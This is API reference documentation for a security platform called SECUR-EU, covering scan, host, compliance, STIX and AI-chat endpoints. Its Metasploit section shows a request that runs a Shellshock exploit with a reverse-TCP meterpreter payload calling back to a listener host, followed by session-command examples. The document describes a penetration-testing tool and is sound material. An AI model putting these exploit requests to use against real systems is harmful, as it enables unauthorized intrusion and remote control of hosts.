---
sidebar_position: 3
---

# API Endpoints

Complete reference for all SECUR-EU API endpoints.

## General

### Health Check

```http
GET /
```

**Response:**
```json
{
  "status": "ok",
  "version": "1.0.0"
}
```

### Dashboard Overview

```http
GET /overview
```

**Response:**
```json
{
  "totalScans": 45,
  "totalVulnerabilities": 127,
  "critical": 12,
  "high": 35,
  "medium": 55,
  "low": 25,
  "lastUpdated": "2024-01-15T10:30:00Z"
}
```

---

## Scans

### List Scans

```http
GET /scans
```

**Query Parameters:**
| Parameter | Type | Description |
|-----------|------|-------------|
| status | string | Filter by status |
| type | string | Filter by scan type |
| limit | integer | Results per page |
| offset | integer | Skip results |

**Response:**
```json
{
  "scans": [
    {
      "id": "scan-001",
      "type": "nmap",
      "target": "192.168.1.0/24",
      "status": "completed",
      "findings": 15,
      "startedAt": "2024-01-15T10:00:00Z",
      "completedAt": "2024-01-15T10:15:00Z"
    }
  ]
}
```

### Get Scan Details

```http
GET /scans/:id
```

**Response:**
```json
{
  "id": "scan-001",
  "type": "nmap",
  "target": "192.168.1.0/24",
  "status": "completed",
  "config": {
    "scanType": "standard",
    "portRange": "1-65535"
  },
  "results": {
    "hosts": [...],
    "vulnerabilities": [...]
  }
}
```

### Start Nmap Scan

```http
POST /scan/nmap
Content-Type: application/json
```

**Request Body:**
```json
{
  "target": "192.168.1.0/24",
  "scanType": "standard",
  "options": {
    "serviceDetection": true,
    "osDetection": false,
    "scriptScan": true
  }
}
```

**Response:**
```json
{
  "scanId": "scan-002",
  "status": "started",
  "containerId": "abc123"
}
```

### Start ZAP Scan

```http
POST /scan/zap
Content-Type: application/json
```

**Request Body:**
```json
{
  "targetUrl": "https://example.com",
  "scanType": "full",
  "options": {
    "spider": true,
    "ajax": true,
    "maxDuration": 3600
  }
}
```

### Start Nuclei Scan

```http
POST /scan/nuclei
Content-Type: application/json
```

**Request Body:**
```json
{
  "target": "https://example.com",
  "templates": ["cves", "vulnerabilities"],
  "severity": ["critical", "high"]
}
```

### Start Multi-Scan

```http
POST /scan/multi
Content-Type: application/json
```

**Request Body:**
```json
{
  "scanner": "nmap",
  "targets": ["192.168.1.10", "192.168.1.20"],
  "scanType": "standard"
}
```

### Delete Scan

```http
DELETE /scans/:id
```

---

## Hosts

### List Hosts

```http
GET /hosts
```

**Response:**
```json
{
  "hosts": [
    {
      "id": "host-001",
      "name": "Web Server",
      "address": "192.168.1.10",
      "type": "server",
      "tags": ["production", "web"],
      "status": "online"
    }
  ]
}
```

### Create Host

```http
POST /hosts
Content-Type: application/json
```

**Request Body:**
```json
{
  "name": "Database Server",
  "address": "192.168.1.20",
  "type": "server",
  "tags": ["production", "database"]
}
```

### Update Host

```http
PUT /hosts/:id
Content-Type: application/json
```

**Request Body:**
```json
{
  "name": "Updated Name",
  "tags": ["production", "critical"]
}
```

### Delete Host

```http
DELETE /hosts/:id
```

---

## Metasploit / Exploitation

### Search Modules

```http
GET /metasploit/modules/search?query=apache
```

**Response:**
```json
{
  "modules": [
    {
      "name": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
      "description": "Apache mod_cgi Bash Environment Variable Code Injection",
      "rank": "excellent",
      "cve": "CVE-2014-6271"
    }
  ]
}
```

### Get Module Info

```http
GET /metasploit/modules/:module_path
```

### Run Exploit

```http
POST /metasploit/exploit
Content-Type: application/json
```

**Request Body:**
```json
{
  "module": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
  "options": {
    "RHOSTS": "192.168.1.100",
    "RPORT": 80,
    "TARGETURI": "/cgi-bin/test.cgi"
  },
  "payload": "linux/x86/meterpreter/reverse_tcp",
  "payloadOptions": {
    "LHOST": "192.168.1.50",
    "LPORT": 4444
  }
}
```

### List Sessions

```http
GET /metasploit/sessions
```

**Response:**
```json
{
  "sessions": [
    {
      "id": 1,
      "type": "meterpreter",
      "info": "www-data @ target",
      "tunnel": "192.168.1.100:80 -> 192.168.1.50:4444"
    }
  ]
}
```

### Execute Session Command

```http
POST /metasploit/sessions/:id/command
Content-Type: application/json
```

**Request Body:**
```json
{
  "command": "sysinfo"
}
```

---

## AI Assistant

### Chat

```http
POST /ai/chat
Content-Type: application/json
```

**Request Body:**
```json
{
  "message": "What are the critical vulnerabilities?",
  "context": {
    "scanId": "scan-001"
  }
}
```

**Response:**
```json
{
  "response": "Based on scan-001, there are 3 critical vulnerabilities...",
  "suggestions": [
    "Would you like remediation steps?"
  ]
}
```

### Analyze Vulnerability

```http
POST /ai/analyze
Content-Type: application/json
```

**Request Body:**
```json
{
  "vulnerabilityId": "vuln-001",
  "analysisType": "full"
}
```

---

## Compliance

### Get CRA Status

```http
GET /compliance/cra
```

### Run CRA Assessment

```http
POST /compliance/cra/assess
Content-Type: application/json
```

**Request Body:**
```json
{
  "targetId": "product-001",
  "scope": {
    "vulnerabilityManagement": true,
    "secureDefault": true
  }
}
```

---

## STIX

### Import STIX Bundle

```http
POST /stix/import
Content-Type: application/json
```

**Request Body:**
```json
{
  "bundle": {
    "type": "bundle",
    "id": "bundle--example",
    "objects": [...]
  }
}
```

### Export as STIX

```http
GET /stix/export/scan/:id
```

### Correlate Scan with Threat Intel

```http
POST /stix/correlate
Content-Type: application/json
```

**Request Body:**
```json
{
  "scanId": "scan-001",
  "correlationTypes": ["indicators", "vulnerabilities"]
}
```

---

## Error Codes

| Code | Description |
|------|-------------|
| INVALID_REQUEST | Malformed request body |
| NOT_FOUND | Resource not found |
| SCAN_FAILED | Scan execution failed |
| CONTAINER_ERROR | Docker container issue |
| AI_ERROR | AI service unavailable |

## Related

- [API Overview](/api/overview)
- [Swagger UI](http://localhost:3001/docs)
